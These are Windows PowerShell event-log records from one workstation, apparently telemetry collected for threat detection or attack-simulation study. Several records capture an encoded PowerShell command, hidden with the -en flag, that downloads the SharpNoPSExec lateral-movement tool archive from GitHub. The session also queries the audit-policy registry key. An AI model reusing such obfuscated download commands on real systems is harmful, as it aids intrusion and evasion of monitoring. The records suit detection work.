<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4103,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":106,"OpcodeValue":20,"RecordNumber":9620,"ActivityID":"{66883D06-FD3B-0000-8E70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"CommandInvocation(Get-Item): \"Get-Item\"\r\nParameterBinding(Get-Item): name=\"Path\"; value=\"hklm:\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n        Pipeline ID = 1\r\n        Command Name = Get-Item\r\n        Command Type = Cmdlet\r\n        Script Name = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1\r\n        Command Path = \r\n        Sequence Number = 18\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","Category":"Executing Pipeline","Opcode":"To be used when operation is just executing a method","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n        Pipeline ID = 1\r\n        Command Name = Get-Item\r\n        Command Type = Cmdlet\r\n        Script Name = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1\r\n        Command Path = \r\n        Sequence Number = 18\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Payload":"CommandInvocation(Get-Item): \"Get-Item\"\r\nParameterBinding(Get-Item): name=\"Path\"; value=\"hklm:\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\n","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4103,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":106,"OpcodeValue":20,"RecordNumber":9599,"ActivityID":"{66883D06-FD3B-0001-026C-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = 42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n        Pipeline ID = 10\r\n        Command Name = PSConsoleHostReadLine\r\n        Command Type = Function\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 73\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","Category":"Executing Pipeline","Opcode":"To be used when operation is just executing a method","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = 42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n        Pipeline ID = 10\r\n        Command Name = PSConsoleHostReadLine\r\n        Command Type = Function\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 73\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Payload":"CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4103,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":106,"OpcodeValue":20,"RecordNumber":9623,"ActivityID":"{66883D06-FD3B-0000-8D70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"CommandInvocation(Out-Default): \"Out-Default\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n        Pipeline ID = 1\r\n        Command Name = \r\n        Command Type = Script\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 25\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","Category":"Executing Pipeline","Opcode":"To be used when operation is just executing a method","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n        Pipeline ID = 1\r\n        Command Name = \r\n        Command Type = Script\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 25\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Payload":"CommandInvocation(Out-Default): \"Out-Default\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\n","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":600,"SourceName":"PowerShell","Version":0,"Task":6,"OpcodeValue":0,"RecordNumber":4341,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Provider \"Environment\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Provider Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9616,"ActivityID":"{66883D06-FD3B-0000-8F70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 0c5780f9-fa59-416b-8709-e692ae5829ac\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"0c5780f9-fa59-416b-8709-e692ae5829ac","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9621,"ActivityID":"{66883D06-FD3B-0000-8E70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 9e87d9b3-f32a-40e1-947f-fa83963071c2\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"9e87d9b3-f32a-40e1-947f-fa83963071c2","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":40962,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":4,"OpcodeValue":2,"RecordNumber":9604,"ActivityID":"{66883D06-FD3B-0000-8B70-28DDCE92D801}","ProcessID":5148,"ThreadID":4784,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"PowerShell console is ready for user input","Category":"PowerShell Console Startup","Opcode":"Stop","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9613,"ActivityID":"{66883D06-FD3B-0001-2A6C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 684ec48b-19cd-4186-9bdd-0458b422b0ad\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"684ec48b-19cd-4186-9bdd-0458b422b0ad","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9601,"ActivityID":"{66883D06-FD3B-0001-226C-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 1642b537-9bee-41a5-8577-c2c65a511c4f\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"1642b537-9bee-41a5-8577-c2c65a511c4f","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4354,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=26\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=4\r\n\tCommandName=\r\n\tCommandType=Script\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9625,"ActivityID":"{66883D06-FD3B-0001-2D6C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 2a6409ed-1956-4505-83bc-65bd79d7f739\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"2a6409ed-1956-4505-83bc-65bd79d7f739","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":40961,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":4,"OpcodeValue":1,"RecordNumber":9602,"ActivityID":"{66883D06-FD3B-0000-8B70-28DDCE92D801}","ProcessID":5148,"ThreadID":4784,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"PowerShell console is starting up","Category":"PowerShell Console Startup","Opcode":"Start","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9609,"ActivityID":"{66883D06-FD3B-0001-286C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 200f9d67-a3b7-40f0-b3c0-621a4e129541\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"200f9d67-a3b7-40f0-b3c0-621a4e129541","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9617,"ActivityID":"{66883D06-FD3B-0000-8F70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 0c5780f9-fa59-416b-8709-e692ae5829ac\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"0c5780f9-fa59-416b-8709-e692ae5829ac","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4334,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"PSConsoleHostReadLine\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=71\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=10\r\n\tCommandName=PSConsoleHostReadLine\r\n\tCommandType=Function\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9615,"ActivityID":"{66883D06-FD3B-0000-8F70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 2fde4d75-9ff7-4ff5-8813-59d29fb8906d\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"2fde4d75-9ff7-4ff5-8813-59d29fb8906d","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4347,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line: Get-Item \"hklm:\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\" \r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=17\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=1\r\n\tScriptName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1\r\n\tCommandLine=Get-Item \"hklm:\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\" \r\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Item): \"Get-Item\"\r\nParameterBinding(Get-Item): name=\"Path\"; value=\"hklm:\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
